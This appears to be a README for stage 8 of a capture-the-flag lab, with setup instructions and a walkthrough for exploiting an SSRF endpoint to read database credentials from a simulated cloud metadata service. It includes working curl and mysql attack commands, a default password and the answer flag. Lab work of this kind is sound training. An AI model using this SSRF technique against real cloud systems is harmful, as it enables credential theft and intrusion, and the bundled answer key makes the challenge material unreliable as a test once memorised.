# Stage 8: Core Infrastructure Breach (Network Pivoting & SSRF)

## Overview
- Category: Network Pivoting & Cloud Metadata SSRF
- Difficulty: Hard
- Points: 500 XP
- Target: NexaCorp Core Infrastructure & Internal Isolated Database
- Delivery: Ubuntu Virtual Machine (QEMU / KVM) or Local Mode with In-Browser Terminal
- Flag: `SHADOWNET{9j_3r4_3xnl3_fl4g_JI**&H_b#4gjB^$_gh%}`

## Architecture

```
                                  HOST MACHINE
                   +----------------------------------------+
                   |    Web Browser (Interactive Console)  |
                   |         http://localhost:7681          |
                   +-------------------^--------------------+
                                       | (Interactive Shell)
                                       |
               +-----------------------v------------------------+
               |              UBUNTU VIRTUAL MACHINE            |
               |                  (QEMU / KVM)                  |
               |                                                |
               |  [Public Perimeter]                            |
               |  * Entry Host Web Portal (Port 3008)           |
               |  * Vulnerable SSRF /fetch endpoint             |
               |                         |                      |
               |                         v (Internal Pivot)     |
               |  [Isolated Subnet: 192.168.100.0/24]           |
               |  * Cloud Metadata Service (192.168.100.10:8080)|
               |  * Production MySQL DB    (192.168.100.10:3306)|
               +------------------------------------------------+
```

## Directory Structure
- `entry-host/`: Perimeter web application (Flask) running on port 3008 with a diagnostic URL fetching endpoint.
- `db-host/`: Internal services simulated on `192.168.100.10`, including cloud metadata API (port 8080) and MySQL database (port 3306).
- `web-terminal/`: In-browser xterm.js terminal server running on port 7681.
- `start_stage8_vm.sh`: Script to provision network interfaces, boot the QEMU VM or launch local services.
- `stop_stage8_vm.sh`: Graceful teardown of the VM and terminal background processes.
- `status_stage8_vm.sh`: Status checker for VM and network processes.
- `ssh_vm.sh`: SSH wrapper script to connect directly into the Ubuntu VM.
- `solve.py`: Automated end-to-end verification and exploit script.
- `SOLUTION.md`: Exploitation walkthrough.

## Quick Start

### Option 1: Full Ubuntu Virtual Machine (QEMU / KVM)
Boots the Ubuntu Server cloud image accelerated by KVM and starts the browser terminal:
```bash
./stages/stage8-network/start_stage8_vm.sh --vm
```

To enable a visible graphical VM desktop window, pass `--gui`:
```bash
./stages/stage8-network/start_stage8_vm.sh --vm --gui
```

### Option 2: Instant Local Mode (Fastest)
Starts the isolated network services locally and launches the web terminal without running a full VM:
```bash
./stages/stage8-network/start_stage8_vm.sh --local
```

### Accessing the Shell
1. Via Web Browser: Open `http://localhost:7681` for the interactive browser terminal.
2. Via SSH:
```bash
./stages/stage8-network/ssh_vm.sh
# Default password if prompted: password123
```

### Stopping Services
```bash
./stages/stage8-network/stop_stage8_vm.sh
```

### Checking Status
```bash
./stages/stage8-network/status_stage8_vm.sh
```

## Exploitation Walkthrough

### 1. Probe the Perimeter Entry Host
Inspect the entry host web portal on port 3008:
```bash
curl -s http://localhost:3008/ | head -n 15
```
Notice the diagnostics interface offering a URL fetch feature at endpoint `/fetch?url=<URL>`.

### 2. Exploit Server-Side Request Forgery (SSRF)
The Entry Host has access to an isolated internal network (`192.168.100.0/24`) that is otherwise unreachable from the outside.

Query the internal cloud metadata service on `192.168.100.10:8080`:
```bash
curl -s "http://localhost:3008/fetch?url=http://192.168.100.10:8080/metadata/db-credentials"
```

Response:
```json
{
  "content": "{\"database\":\"nexacorp\",\"host\":\"192.168.100.10\",\"password\":\"SecurePass123\",\"port\":3306,\"username\":\"db_user\"}\n",
  "status": 200,
  "url": "http://192.168.100.10:8080/metadata/db-credentials"
}
```

The metadata service returns the internal database credentials:
- Host: `192.168.100.10`
- Port: `3306`
- Database: `nexacorp`
- Username: `db_user`
- Password: `SecurePass123`

### 3. Connect to the Internal Database & Extract the Flag
From within the VM (or pivot host), query the MySQL database:
```bash
mysql -h 192.168.100.10 -u db_user -pSecurePass123 -D nexacorp -e "SELECT flag FROM flags WHERE challenge='final_breach';"
```

Output:
```
+----------------------------------------------------+
| flag                                               |
+----------------------------------------------------+
| SHADOWNET{9j_3r4_3xnl3_fl4g_JI**&H_b#4gjB^$_gh%}   |
+----------------------------------------------------+
```

### 4. Automated Verification
You can also run the bundled test script to verify the exploit:
```bash
python3 stages/stage8-network/solve.py
```
